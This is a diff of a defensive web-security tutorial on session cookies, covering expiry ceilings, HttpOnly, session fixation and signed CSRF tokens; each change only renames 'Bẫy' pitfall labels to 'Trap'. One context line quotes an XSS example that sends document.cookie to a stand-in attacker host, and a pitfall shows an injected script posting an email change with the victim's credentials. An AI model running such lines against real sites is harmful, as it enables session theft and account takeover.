@@ -124,7 +124,7 @@ Set-Cookie: __Host-phien=Kc9x2Lm…; Path=/; HttpOnly; Secure; SameSite=Lax; Max
   </div>
 </div>
 <div class="pitfall">
-<p><strong>Bẫy — sliding expiry alone means a stolen session never expires.</strong> If every request pushes the deadline forward, an attacker who polls a harmless endpoint once an hour keeps the session alive indefinitely, and the legitimate user has no idea. That is exactly what the absolute ceiling is for: no amount of activity extends <code>hetHanTuyetDoi</code>, so the session ends on schedule regardless of who was using it.</p>
+<p><strong>Trap — sliding expiry alone means a stolen session never expires.</strong> If every request pushes the deadline forward, an attacker who polls a harmless endpoint once an hour keeps the session alive indefinitely, and the legitimate user has no idea. That is exactly what the absolute ceiling is for: no amount of activity extends <code>hetHanTuyetDoi</code>, so the session ends on schedule regardless of who was using it.</p>
 </div>
 <div class="kv-grid">
   <div class="kv"><span class="k">Banking: 15 minutes idle, 12 hours absolute</span><span class="v">High-value actions, users who expect to be logged out. The friction is understood and accepted in that context.</span></div>
@@ -328,7 +328,7 @@ fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 // Co HttpOnly:
 "theme=dark"                              ← chi con cookie khong nhay cam</div>
 <div class="pitfall">
-<p><strong>Bẫy — <code>HttpOnly</code> stops the token being <em>read</em>; it does not stop it being <em>used</em>.</strong> An attacker's script running on your page can still call <code>fetch('/api/doi-email', {method:'POST', credentials:'include', …})</code> and the browser attaches the cookie automatically. The session is not stolen, but the attacker acts as the user for as long as the script runs. <code>HttpOnly</code> turns permanent account takeover into a session-length problem — a large improvement, and not a fix for XSS.</p>
+<p><strong>Trap — <code>HttpOnly</code> stops the token being <em>read</em>; it does not stop it being <em>used</em>.</strong> An attacker's script running on your page can still call <code>fetch('/api/doi-email', {method:'POST', credentials:'include', …})</code> and the browser attaches the cookie automatically. The session is not stolen, but the attacker acts as the user for as long as the script runs. <code>HttpOnly</code> turns permanent account takeover into a session-length problem — a large improvement, and not a fix for XSS.</p>
 </div>
 
 <h3><code>Secure</code> — HTTPS only, with one useful exception</h3>
@@ -650,7 +650,7 @@ app.post('/dang-nhap', async (req, res) =&gt; {
   datCookiePhien(res, await taoPhien(nd.id, req));
 });</code></pre>
 <div class="pitfall">
-<p><strong>Bẫy — an anonymous session that survives login is the vulnerability wearing a feature's clothes.</strong> "Keep the cart" is a real requirement, and the wrong implementation of it — keeping the session id so the cart stays attached — is exactly the fixation bug. Move the <em>rows</em> to the user, revoke the old session, issue a new one. The user sees their cart; the attacker's planted id is dead.</p>
+<p><strong>Trap — an anonymous session that survives login is the vulnerability wearing a feature's clothes.</strong> "Keep the cart" is a real requirement, and the wrong implementation of it — keeping the session id so the cart stays attached — is exactly the fixation bug. Move the <em>rows</em> to the user, revoke the old session, issue a new one. The user sees their cart; the attacker's planted id is dead.</p>
 </div>
 
 <h3>Step-up: proving it is still you</h3>
@@ -953,7 +953,7 @@ export function kiemTokenCsrf(req, res, next) {
   next();
 }</code></pre>
 <div class="pitfall">
-<p><strong>Bẫy — unsigned double-submit is broken by any subdomain that can set cookies.</strong> The naive version compares a cookie against a header and accepts them if they match — but an attacker who controls <code>cu.vidu.com</code> can set <em>both</em> to a value they chose, and the check passes. Binding the token to the session id with an HMAC, as above, makes a forged pair fail because the attacker cannot compute the signature for the victim's session. If you use double-submit, sign it.</p>
+<p><strong>Trap — unsigned double-submit is broken by any subdomain that can set cookies.</strong> The naive version compares a cookie against a header and accepts them if they match — but an attacker who controls <code>cu.vidu.com</code> can set <em>both</em> to a value they chose, and the check passes. Binding the token to the session id with an HMAC, as above, makes a forged pair fail because the attacker cannot compute the signature for the victim's session. If you use double-submit, sign it.</p>
 </div>
 <div class="kv-grid">
   <div class="kv"><span class="k">When you actually need a token</span><span class="v"><code>SameSite=None</code> because you are embedded cross-site · a browser SPA on a different origin sending cookies · a compliance requirement that names it · or an untrusted subdomain you cannot move.</span></div>
@@ -1218,7 +1218,7 @@ Set-Cookie: __Host-phien=Fe26.2**a1b2c3…**d4e5f6…**7a8b9c…; …
   <div class="kv"><span class="k">❌ Stale data, structurally</span><span class="v">If <code>vaiTro</code> lives in the cookie, a role change does not take effect until the cookie is reissued. Either you re-set it on every response — which is a write of a different kind — or you accept that authorisation reads stale data.</span></div>
 </div>
 <div class="pitfall">
-<p><strong>Bẫy — "stateless" usually becomes "stateful, badly" within a year.</strong> The first requirement that breaks it is always the same: someone asks for a logout button that actually works, or for "sign out of all devices", or for an admin to be able to disable an account immediately. The answer is a denylist, which is a database — but now it is a database you consult <em>in addition to</em> the cookie, with none of the benefits of having used one from the start. Decide up front whether instant revocation is a requirement; if it is, this option is already excluded.</p>
+<p><strong>Trap — "stateless" usually becomes "stateful, badly" within a year.</strong> The first requirement that breaks it is always the same: someone asks for a logout button that actually works, or for "sign out of all devices", or for an admin to be able to disable an account immediately. The answer is a denylist, which is a database — but now it is a database you consult <em>in addition to</em> the cookie, with none of the benefits of having used one from the start. Decide up front whether instant revocation is a requirement; if it is, this option is already excluded.</p>
 </div>
 
 <h3>Choosing</h3>
